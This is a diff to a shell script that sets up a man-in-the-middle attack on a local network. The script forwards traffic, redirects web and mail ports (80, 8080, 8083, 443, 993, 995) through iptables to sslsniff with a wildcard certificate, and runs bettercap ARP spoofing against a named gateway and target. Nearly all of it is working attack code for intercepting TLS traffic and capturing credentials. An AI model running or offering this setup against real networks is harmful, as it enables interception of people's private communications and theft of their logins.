@@ -26,6 +26,8 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 echo "Setting up SSLSNIFF rules to port 6666"
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 6666
+iptables -t nat -A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-ports 6666
+iptables -t nat -A PREROUTING -p tcp --destination-port 8083 -j REDIRECT --to-ports 6666
 iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 6666
 iptables -t nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-ports 6666
 iptables -t nat -A PREROUTING -p tcp --destination-port 995 -j REDIRECT --to-ports 6666
@@ -39,11 +41,12 @@ mkdir ${4}
 
 echo "Starting SSLSNIFF"
 cd /usr/share/sslsniff/certs/certs
-
-sslsniff -a 6666 -w "${4}/sslsniff.log" -c wildcard &
+killall sslsniff
+sslsniff -a -l 6666 -w "${4}/sslsniff.log" -m IPSCACLASEA1.crt -c wildcard &
 
 echo "SSL SNIFF RUNNING IN BG. PLEASE CLOSE WITH KILL WHEN DONE OR YOU WILL GET CONFLICTS"
 echo "-------"
 
 echo "Starting bettercap"
-bettercap -I ${1} -O "${4}bettercap.log" -S ARP -X --gateway ${2} --target ${3}
+bettercap -I ${1} -O "${4}/bettercap.log" -S ARP -X --gateway ${2} --target ${3}
+ 	
